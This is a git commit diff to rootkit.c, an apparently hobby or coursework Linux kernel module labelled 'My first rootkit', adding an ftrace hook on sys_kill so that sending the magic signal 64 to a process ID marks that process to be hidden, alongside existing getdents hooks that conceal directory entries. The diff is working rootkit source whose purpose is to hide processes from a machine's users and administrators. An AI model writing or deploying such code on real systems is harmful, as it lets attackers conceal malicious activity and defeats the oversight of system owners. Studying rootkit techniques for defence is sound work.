64f074f1af6ed34bb4a40b96339a1fe05594aaa6
Mark Nelson <marknels@hawaii.edu>
2022-06-23 10:34:33 +0000

    New feature: Make process disappear

--- rootkit.c
+++ rootkit.c
@@ -15,16 +15,39 @@ MODULE_AUTHOR("A Lunatic Scotsman");
 MODULE_DESCRIPTION("My first rootkit");
 MODULE_VERSION("0.00");
 
+// Global variable to store the pid that we are going to hide
+char hide_pid[NAME_MAX];
+
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents)(const struct pt_regs *);
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 #include "getdents.include"
+
+// This is our hooked function for sys_kill 
+asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+    pid_t pid = regs->di;
+    int sig = regs->si;
+
+    if ( sig == 64 )
+    {
+        // If we receive the magic signal
+        // then put the pid into the hide_pid string
+        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
+        sprintf(hide_pid, "%d", pid);
+        return 0;
+    }
+
+    return orig_kill(regs);
+}
 
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
 
 
